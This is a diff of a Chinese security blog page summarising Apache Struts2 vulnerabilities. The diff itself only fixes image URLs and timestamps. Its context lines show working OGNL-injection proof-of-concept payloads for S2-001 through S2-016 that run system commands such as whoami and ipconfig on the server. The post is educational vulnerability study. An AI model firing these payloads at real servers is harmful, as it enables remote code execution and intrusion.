@@ -15,19 +15,19 @@
 <meta property="og:site_name" content="Sec-note">
 <meta property="og:description" content="Struts 漏洞2017年Struts被爆出的漏洞比以往多了很多，抽时间整理一下其中的环境以及POC和漏洞分析，学习一下其中的漏洞原理分析和防御，以后如果再次爆发这样漏洞的时候，也能试着分析一下，不用再去傻傻的等着了。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-8/83653243.jpg">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-8/44152038.jpg">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-8/82304633.jpg">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-8/43559389.jpg">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-9/44059606.jpg">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-9/43990420.jpg">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-9/80192149.jpg">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-9/26707957.jpg">
-<meta property="og:updated_time" content="2018-12-11T12:38:53.067Z">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-8/83653243.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-8/44152038.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-8/82304633.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-8/43559389.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-9/44059606.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-9/43990420.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-9/80192149.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-9/26707957.jpg">
+<meta property="og:updated_time" content="2018-12-12T01:32:55.460Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Struts2 漏洞简单汇总">
 <meta name="twitter:description" content="Struts 漏洞2017年Struts被爆出的漏洞比以往多了很多，抽时间整理一下其中的环境以及POC和漏洞分析，学习一下其中的漏洞原理分析和防御，以后如果再次爆发这样漏洞的时候，也能试着分析一下，不用再去傻傻的等着了。">
-<meta name="twitter:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-8/83653243.jpg">
+<meta name="twitter:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-8/83653243.jpg">
   
     <link rel="alternate" href="/atom.xml" title="Sec-note" type="application/atom+xml">
   
@@ -173,8 +173,8 @@
 <pre><code>%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()}
 </code></pre><p>命令执行</p>
 <pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
-</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-8/83653243.jpg" alt=""></p>
-<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-8/44152038.jpg" alt=""></p>
+</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-8/83653243.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-8/44152038.jpg" alt=""></p>
 <h5 id="S2-003"><a href="#S2-003" class="headerlink" title="S2-003"></a>S2-003</h5><p><strong>参考<a href="http://security.ctocio.com.cn/100/11466600.shtml" target="_blank" rel="noopener">Struts2和Webwork远程命令执行漏洞分析</a>、<a href="https://www.jianshu.com/p/c412c2961715" target="_blank" rel="noopener">Struts-S2-003漏洞利用（含环境搭建、含POC）</a>。</strong></p>
 <p><strong>影响版本</strong></p>
 <pre><code>Struts 2.0.0 - Struts 2.0.11.2
@@ -192,16 +192,16 @@
 <p>S2-005是由于官方在修补S2-003不全面导致绕过补丁造成的。我们都知道访问Ognl的上下文对象必须要使用#符号，S2-003对#号进行过滤，但是没有考虑到unicode编码情况，导致\u0023或者8进制\43绕过。<br>S2-005则是绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成漏洞。</p>
 <p><strong>POC</strong></p>
 <pre><code>?(&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;)(bla)(bla)&amp;(&apos;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&apos;)(kxlzx)(kxlzx)&amp;(&apos;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&apos;)(bla)(bla)&amp;(&apos;\u0023mycmd\u003d\&apos;ipconfig\&apos;&apos;)(bla)(bla)&amp;(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&apos;)(bla)(bla)&amp;(A)((&apos;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&apos;)(bla))&amp;(B)((&apos;\u0023myres\u003dnew\40byte[51020]&apos;)(bla))&amp;(C)((&apos;\u0023mydat.readFully(\u0023myres)&apos;)(bla))&amp;(D)((&apos;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&apos;)(bla))&amp;(&apos;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&apos;)(bla)(bla)&amp;(E)((&apos;\u0023myout.getWriter().println(\u0023mystr)&apos;)(bla))
-</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-8/82304633.jpg" alt=""></p>
+</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-8/82304633.jpg" alt=""></p>
 <p>更改命令为whoami，提示下载文件。文件中含有执行命令的结果。</p>
-<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-8/43559389.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-8/43559389.jpg" alt=""></p>
 <h5 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h5><p><strong> 影响版本 </strong></p>
 <pre><code>Struts 2.0.0 - Struts 2.2.3
 </code></pre><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-007" target="_blank" rel="noopener">官方链接</a></p>
 <p>当有转换错误时，用户输入被评估为OGNL表达式。这允许恶意用户执行任意代码。</p>
 <p>POC</p>
 <pre><code>&apos; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;whoami&apos;).getInputStream())) + &apos;
-</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-9/44059606.jpg" alt=""></p>
+</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-9/44059606.jpg" alt=""></p>
 <p>会在age中得到相应的信息。</p>
 <h5 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h5><ul>
 <li><p>影响版本 </p>
@@ -219,17 +219,17 @@
 <pre><code>/showcase.action?debug=command&amp;expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,%23cmd=&quot;ipconfig&quot;,%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[1000],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))
 </code></pre><h5 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h5><p>影响版本: 2.1.0 - 2.3.1.1</p>
 <p><a href="https://github.com/sie504/vulhub/tree/master/struts2/s2-009" target="_blank" rel="noopener">S2-009</a></p>
-<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-9/43990420.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-9/43990420.jpg" alt=""></p>
 <h5 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h5><p>影响版本: 2.1.0 - 2.3.13</p>
 <p><a href="https://cwiki.apache.org/confluence/display/WW/S2-012" target="_blank" rel="noopener">官方链接</a></p>
 <pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
-</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-9/80192149.jpg" alt=""></p>
+</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-9/80192149.jpg" alt=""></p>
 <h5 id="S2-013-S2-014"><a href="#S2-013-S2-014" class="headerlink" title="S2-013,S2-014"></a>S2-013,S2-014</h5><p>影响版本： Struts 2.0.0 - Struts 2.3.14-Struts 2.0.0 - Struts 2.3.14.1</p>
 <p><a href="https://cwiki.apache.org/confluence/display/WW/S2-013" target="_blank" rel="noopener">S2-013</a></p>
 <p><a href="https://cwiki.apache.org/confluence/display/WW/S2-014" target="_blank" rel="noopener">S2-014</a></p>
 <p> POC</p>
 <pre><code>/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&apos;calc&apos;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&apos;dbapp%3D&apos;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D
-</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-9/26707957.jpg" alt=""></p>
+</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-9/26707957.jpg" alt=""></p>
 <h5 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h5><p>影响版本：Struts 2.0.0 - Struts 2.3.15</p>
 <p><a href="https://cwiki.apache.org/confluence/display/WW/S2-016" target="_blank" rel="noopener">官方链接</a></p>
 <p><a href="http://www.freebuf.com/vuls/11220.html" target="_blank" rel="noopener">S2-016</a></p>
@@ -258,7 +258,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/01/09/Struts2-xxx/" data-id="cjpjt0n60003t4dxdfbsg5d2f" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/01/09/Struts2-xxx/" data-id="cjpki3m82003qwgxdtet02v47" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Struts/">Struts</a></li></ul>
